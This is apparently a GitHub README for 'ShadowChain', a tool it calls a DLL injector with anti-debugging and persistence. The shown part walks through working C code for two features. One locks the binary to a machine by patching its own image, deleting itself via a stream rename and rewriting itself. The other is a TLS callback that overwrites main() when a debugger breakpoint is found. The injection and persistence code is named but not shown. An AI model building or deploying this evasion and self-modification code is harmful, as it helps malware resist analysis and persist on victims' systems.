# ShadowChain
---------
Shadow Chain is a DRM enabled dll injector with capabilities of Anti-debugging and persistence.

# Features Of ShadowChain

1. Digital Rights Management(DRM) using volume serial number of the machine
2. Anti-debugging usig TLS Callbacks
3. IAT Camoflague
4. Remote process Dll Injection
5. Persistence using Startup Folder

# Explanation Of Working Of ShadowChain

## Digital Rights Management
-------
The `IsSameMachine()` function in the `ShadowChain.c` file is responsible for implementing a Digital Rights Management (DRM) mechanism. This function ensures that the program runs only on the machine it was originally installed on by checking and patching the executable with the machine's volume serial number. Here is a detailed explanation of how the `IsSameMachine()` function works:

### Function Overview
The `IsSameMachine()` function performs the following steps:
1. Retrieves the volume serial number of the C: drive.
2. Compares the retrieved serial number with a stored constant value.
3. If the serial number matches the stored value, it confirms that the program is running on the same machine.
4. If the serial number does not match, it checks if the stored value is an initial placeholder value.
5. If the stored value is the initial placeholder, it patches the executable with the current serial number.
6. If the stored value is not the initial placeholder, it indicates that the program is running on a different machine.

### Flowchart Of DRM
![image](https://github.com/user-attachments/assets/6c24eb1a-78d6-43f1-8722-87f59f3b7841)

### Detailed Steps

1. **Retrieve Volume Serial Number**:
   ```C
   DWORD dwSerialNumber = 0x00;
   if (!GetVolumeInformationW(L"C:\\", NULL, 0x00, &dwSerialNumber, NULL, NULL, NULL, 0x00) || dwSerialNumber == 0x00) {
    printf("[!] GetVolumeInformationW Failed With Error: %d \n", GetLastError());
    return FALSE;
   }
   ```
    - The function uses `GetVolumeInformationW` to retrieve the volume serial number of the C: drive.
    - If the function fails or the serial number is zero, it prints an error message and returns `FALSE`.

2. **Compare Serial Number with Stored Value**:
   ```C
   printf("[i] New Volume Serial Number: 0x%0.4X\n", dwSerialNumber);
   printf("[i] Old Volume Serial Number: 0x%0.4X\n", g_dwSerialNumberConstVariable);

   if (g_dwSerialNumberConstVariable == dwSerialNumber) {
    printf("[*] Same Machine \n");
    return TRUE;
   }
   ```
    - The function prints the retrieved serial number and the stored constant value (`g_dwSerialNumberConstVariable`).
    - If the retrieved serial number matches the stored value, it confirms that the program is running on the same machine and returns `TRUE`.

![image](https://github.com/user-attachments/assets/9f10fa16-e954-4000-a71d-8c9b066463d6)


3. **Check for Initial Placeholder Value**:
    ```C
    if (g_dwSerialNumberConstVariable != INITIAL_VALUE) {
    printf("[!] Different Machine \n");
    return FALSE;
   }
   ```
   - If the stored value does not match the retrieved serial number, the function checks if the stored value is the initial placeholder (`INITIAL_VALUE`).
   - If the stored value is not the initial placeholder, it indicates that the program is running on a different machine and returns `FALSE`.

4. **Patch Executable with Current Serial Number**:
    ```C
    printf("[i] First Time Running, Patching Image ... \n");

   szLocalImage = (LPWSTR)(((PPEB)__readgsqword(0x60))->ProcessParameters->ImagePathName.Buffer);
   if (!ReadSelfFromDiskW(szLocalImage, &uModule, &dwFileSize))
       goto _FUNC_CLEANUP;

   pImgNtHdrs = uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew;
   if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
       goto _FUNC_CLEANUP;

   pImgSec = IMAGE_FIRST_SECTION(pImgNtHdrs);
   for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections && !uMachineSerialVA; i++) {
       if (*(ULONG*)pImgSec[i].Name == 'adr.') {
           for (int x = 0; x < pImgSec[i].SizeOfRawData && !uMachineSerialVA; x += sizeof(DWORD)) {
               if (*(DWORD*)(uModule + pImgSec[i].PointerToRawData + x) == g_dwSerialNumberConstVariable)
                   uMachineSerialVA = (uModule + pImgSec[i].PointerToRawData + x);
           }
       }
   }

   if (uMachineSerialVA != 0x00) {
       *(DWORD*)uMachineSerialVA = dwSerialNumber;

       if (!DeleteSelfFromDiskW(szLocalImage))
           goto _FUNC_CLEANUP;

       if (!WriteSelfToDiskW(szLocalImage, uModule, dwFileSize))
           goto _FUNC_CLEANUP;

       bResult = TRUE;
   }
   ```
    - If the stored value is the initial placeholder, the function proceeds to patch the executable with the current serial number.
    - It retrieves the path of the current executable and reads its contents into memory using `ReadSelfFromDiskW`.
    - It locates the NT headers and the `.rdata` section where the serial number is stored.
    - It searches for the initial placeholder value in the `.rdata` section and replaces it with the current serial number.
    - It deletes the old executable from disk using `DeleteSelfFromDiskW` and writes the patched executable back to disk using `WriteSelfToDiskW`.
    - If the patching is successful, it sets the result to `TRUE`.

5. **Cleanup and Return**:
   ```C
   _FUNC_CLEANUP:
   if (uModule != NULL)
       HeapFree(GetProcessHeap(), 0x00, uModule);
   return bResult;
     ```
- The function performs cleanup by freeing the allocated memory and returns the result.    

6. `ReadSelfFromDiskW` Function
The `ReadSelfFromDiskW` function reads the executable image of the current process from disk. Here is a detailed explanation of how the function works:

```C
// Function to read self image from disk
BOOL ReadSelfFromDiskW(IN LPWSTR szLocalImageName, OUT ULONG_PTR* pModule, OUT DWORD* pdwFileSize) {

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	PBYTE		pFileBuffer = NULL;
	DWORD		dwFileSize = 0x00,
		dwNumberOfBytesRead = 0x00;

	// Check if the parameters are valid
	if (!szLocalImageName || !pModule || !pdwFileSize)
		return FALSE;

	// Open the file
	if ((hFile = CreateFileW(szLocalImageName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Get the file size
	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Allocate memory for the file
	if ((pFileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Read the file
	if (!ReadFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Return the file buffer and the file size
	*pModule = (ULONG_PTR)pFileBuffer;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (!*pModule && pFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pFileBuffer);
	return *pModule == NULL ? FALSE : TRUE;
}

```

It takes three parameters.
- `szLocalImageName`: The path to the executable image.
- `pModule`: A pointer to store the address of the read image.
- `pdwFileSize`: A pointer to store the size of the read image.

After accepting the required parameters, it -
- Initializes variables for the file handle, file buffer, file size, and number of bytes read.
- Checks if the input parameters are valid. If not, returns `FALSE`.
- Opens the file for reading. If it fails, prints an error message and jumps to the cleanup section.
- Retrieves the file size. If it fails, prints an error message and jumps to the cleanup section.
- Allocates memory to store the file contents. If it fails, prints an error message and jumps to the cleanup section.
- Reads the file into the allocated buffer. If it fails, prints an error message and jumps to the cleanup section.
- Stores the file buffer address and size in the output parameters.
- Closes the file handle and frees the allocated memory if necessary. Returns `TRUE` if successful, `FALSE` otherwise.

7. `WriteSelfToDiskW` Function
The `WriteSelfToDiskW` function writes the executable image to disk. Here is a detailed explanation of how the function works:

```C
// Function to write self image to disk
BOOL WriteSelfToDiskW(IN LPWSTR szLocalImageName, IN PVOID pImageBase, IN DWORD sImageSize) {

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	DWORD		dwNumberOfBytesWritten = 0x00;

	// Check if the parameters are valid
	if (!szLocalImageName || !pImageBase || !sImageSize)
		return FALSE;

	// Open the file
	if ((hFile = CreateFileW(szLocalImageName, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Write the file
	if (!WriteFile(hFile, pImageBase, sImageSize, &dwNumberOfBytesWritten, NULL) || sImageSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return dwNumberOfBytesWritten == sImageSize ? TRUE : FALSE;
}

```

It takes three parameters.
- `szLocalImageName`: The path to the executable image.
- `pImageBase`: The address of the image to be written.
- `sImageSize`: The size of the image to be written.

After accepting the required parameters, it -
- Initializes variables for the file handle and number of bytes written.
- Checks if the input parameters are valid. If not, returns `FALSE`.
- Opens the file for writing. If it fails, prints an error message and jumps to the cleanup section.
- Writes the image to the file. If it fails, prints an error message and jumps to the cleanup section.
- Closes the file handle and returns `TRUE` if the write was successful, `FALSE` otherwise.

8. `DeleteSelfFromDiskW` Function
The `DeleteSelfFromDiskW` function deletes the executable image from disk by renaming it and then setting it for deletion.

```C
// Structure for File Deletion
typedef struct _FILE_RENAME_INFO2 {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
	union {
		BOOLEAN ReplaceIfExists;
		DWORD Flags;
	} DUMMYUNIONNAME;
#else
	BOOLEAN ReplaceIfExists;
#endif
	HANDLE RootDirectory;
	DWORD FileNameLength;
	WCHAR FileName[MAX_PATH]; // Instead of "WCHAR FileName[1]" (See FILE_RENAME_INFO's original documentation)
} FILE_RENAME_INFO2, * PFILE_RENAME_INFO2;

// Function to delete file image from disk
BOOL DeleteSelfFromDiskW(IN LPCWSTR szFileName) {

	BOOL						bResult = FALSE;
	HANDLE                      hFile = INVALID_HANDLE_VALUE;
	FILE_DISPOSITION_INFO       DisposalInfo = { .DeleteFile = TRUE };
	FILE_RENAME_INFO2			RenameInfo = { .FileNameLength = sizeof(L":%x%x\x00"), .ReplaceIfExists = FALSE, .RootDirectory = 0x00 };

	// Check if the parameters are valid
	if (!szFileName)
		return FALSE;

	// Generate a random name
	swprintf(RenameInfo.FileName, MAX_PATH, L":%x%x\x00", rand(), rand() * rand());

	// Open the file
	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Rename the file
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, &RenameInfo, sizeof(RenameInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Close the handle
	CloseHandle(hFile);

	// Open the file again
	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Delete the file
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &DisposalInfo, sizeof(DisposalInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Set the result to TRUE
	bResult = TRUE;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResult;
}

```

It only takes one parameter.
- `szFileName`: The path to the executable image to be deleted.

Then it - 
- Initializes variables for the result, file handle, file disposition info, and file rename info.
- Checks if the input parameter is valid. If not, returns `FALSE`.
- Generates a random name for the file.
- Opens the file for deletion. If it fails, prints an error message and jumps to the cleanup section.
- Renames the file. If it fails, prints an error message and jumps to the cleanup section.
- Closes the file handle and reopens the file for deletion. If it fails, prints an error message and jumps to the cleanup section.
- Sets the file for deletion. If it fails, prints an error message and jumps to the cleanup section.
- Sets the result to `TRUE` if the file was successfully deleted.
- Closes the file handle and returns the result.

## Anti-Debugging Using TLS Callbacks
---------
TLS callbacks are a set of callback functions specified within the TLS directory of a PE file, these callbacks are executed by the Windows loader before thread creation, meaning that a TLS callback can be executed before the main thread. From an anti-analysis perspective, TLS callbacks can be used to check if the implementation is being analyzed before executing the main function.

The `ReadSelfFromDiskW` function reads the executable image of the current process from disk. Here is a detailed explanation of how the function works:

### Preprocessor code

```C
#pragma once
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:CheckIfImgOpenedInADebugger")

//----------------------------------------------------------------------------------------------------------------

#define OVERWRITE_SIZE				0x500
#define INT3_INSTRUCTION_OPCODE		0xCC

//----------------------------------------------------------------------------------------------------------------
#define ERROR_BUF_SIZE				(MAX_PATH * 2)
//----------------------------------------------------------------------------------------------------------------
#define PRINT( STR, ... )                                                                           \
    if (1) {                                                                                        \
        LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
        if (cBuffer){                                                                               \
            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
            HeapFree(GetProcessHeap(), 0x00, cBuffer);                                              \
        }                                                                                           \
    }  

//----------------------------------------------------------------------------------------------------------------

extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
    unsigned char* p = (unsigned char*)pTarget;
    while (cbTarget-- > 0) {
        *p++ = (unsigned char)value;
    }
    return pTarget;
}

//----------------------------------------------------------------------------------------------------------------
// TLS Callback Function Prototypes:

VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);

#pragma const_seg(".CRT$XLB")
EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CALLBACK)ADTlsCallback;
#pragma const_seg()
```
##### Linker Directives
- This directive instructs the linker to include the symbol `_tls_used` in the output file. This is necessary to ensure that the TLS (Thread Local Storage) callbacks are properly registered and executed.
`#pragma comment (linker, "/INCLUDE:_tls_used")`
- This directive instructs the linker to include the symbol `CheckIfImgOpenedInADebugger` in the output file. This is necessary to ensure that the TLS callback function `ADTlsCallback` is properly registered and executed.
`#pragma comment (linker, "/INCLUDE:CheckIfImgOpenedInADebugger")`


##### Constants And Macros
- Defines the size (in bytes) to be overwritten in the `main` function if an `INT 3` instruction is detected. The value `0x500` (1280 bytes) is used as the overwrite size.
`#define OVERWRITE_SIZE 0x500`
- Defines the opcode for the `INT 3` instruction, which is commonly used by debuggers to set breakpoints. The value `0xCC` is the opcode for the `INT 3` instruction.
`#define INT3_INSTRUCTION_OPCODE 0xCC`
- Defines the size of the error buffer used in the `PRINT` macro. The value is set to twice the maximum path length (`MAX_PATH`), which is typically 260 characters.
`#define ERROR_BUF_SIZE (MAX_PATH * 2)`
- Defines a macro for printing formatted strings to the console. The macro allocates a buffer, formats the string, writes it to the console, and then frees the buffer.
```C
#define PRINT( STR, ... )                                                                           \
    if (1) {                                                                                        \
        LPSTR cBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ERROR_BUF_SIZE);       \
        if (cBuffer){                                                                               \
            int iLength = wsprintfA(cBuffer, STR, __VA_ARGS__);                                     \
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), cBuffer, iLength, NULL, NULL);           \
            HeapFree(GetProcessHeap(), 0x00, cBuffer);                                              \
        }                                                                                           \
    } 
```

##### Custom memset Function
- Declares an external `memset` function with the `__cdecl` calling convention.
- Instructs the compiler to use the intrinsic version of the `memset` function, if available.
- Instructs the compiler to use the user-defined version of the `memset` function, overriding the intrinsic version.
- Implements a custom `memset` function that fills a block of memory with a specified value.
```C
extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
    unsigned char* p = (unsigned char*)pTarget;
    while (cbTarget-- > 0) {
        *p++ = (unsigned char)value;
    }
    return pTarget;
}
```

##### TLS Callback Function Prototypes
- Declares the prototype for the TLS callback function `ADTlsCallback`.
- Instructs the compiler to place the following constant data in the `.CRT$XLB` section.
- Defines a constant pointer to the `ADTlsCallback` function and places it in the `.CRT$XLB` section. This ensures that the TLS callback function is registered and executed when the process is attached.
- Resets the section to the default.
```C
VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);

#pragma const_seg(".CRT$XLB")
EXTERN_C CONST PIMAGE_TLS_CALLBACK CheckIfImgOpenedInADebugger = (PIMAGE_TLS_CALLBACK)ADTlsCallback;
#pragma const_seg()
```

### TLS Function Code

```C
// Anti-debugging TLS Callback Function
VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {

	DWORD		dwOldProtection = 0x00;

	// Get the address of the main function
	if (dwReason == DLL_PROCESS_ATTACH) {
		PRINT("[TLS][i] Main Function Address: 0x%p \n", main);

		// Check if the entry point is patched with INT 3 instruction
		if (*(BYTE*)main == INT3_INSTRUCTION_OPCODE) {
			PRINT("[TLS][!] Entry Point Is Patched With \"INT 3\" Instruction!\n");

			// Overwrite main function - process crash
			if (VirtualProtect(&main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
				memset(main, 0xFF, OVERWRITE_SIZE);
				PRINT("[TLS][+] Main Function Is Overwritten With 0xFF Bytes \n");
			}

			// Restore the original protection
			else {
				PRINT("[TLS][!] Failed To Overwrite The Entry Point\n");
			}

		}
	}
}
```
The `ADTlsCallBack` function requires three parameters -

- `hModule`: A handle to the module.
- `dwReason`: The reason for the callback. This can be one of several values, such as `DLL_PROCESS_ATTACH`, `DLL_THREAD_ATTACH`, `DLL_THREAD_DETACH`, or `DLL_PROCESS_DETACH`.
- `pContext`: Reserved for future use and is typically `NULL`.

After accepting the parameters, the function - 

- Initializes a variable to store the old protection attributes of the memory region.
```C
DWORD dwOldProtection = 0x00;
```
- Checks if the reason for the callback is `DLL_PROCESS_ATTACH`, which indicates that the process is being attached.
```C
if (dwReason == DLL_PROCESS_ATTACH) {
```
- Uses the `PRINT` macro to print the address of the `main` function.
```C
PRINT("[TLS][i] Main Function Address: 0x%p \n", main);
```
- Checks if the first byte of the `main` function is the `INT 3` instruction opcode (`0xCC`), which is commonly used by debuggers to set breakpoints.
- If the entry point is patched with the `INT 3` instruction, it prints a warning message.
```C
if ((BYTE)main == INT3_INSTRUCTION_OPCODE) {
	PRINT("[TLS][!] Entry Point Is Patched With "INT 3" Instruction!\n");
}
```
- Attempts to change the protection of the memory region containing the `main` function to `PAGE_EXECUTE_READWRITE` using `VirtualProtect`.
- If successful, it overwrites the `main` function with `0xFF` bytes using the custom `memset` function.
- Prints a message indicating that the `main` function has been overwritten.
```C
if (VirtualProtect(&main, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
	memset(main, 0xFF, OVERWRITE_SIZE);
	PRINT("[TLS][+] Main Function Is Overwritten With 0xFF Bytes \n");
}
```
- If the `VirtualProtect` call fails, it prints a message indicating that it failed to overwrite the entry point.
```C
else {
	PRINT("[TLS][!] Failed To Overwrite The Entry Point\n");
}
```









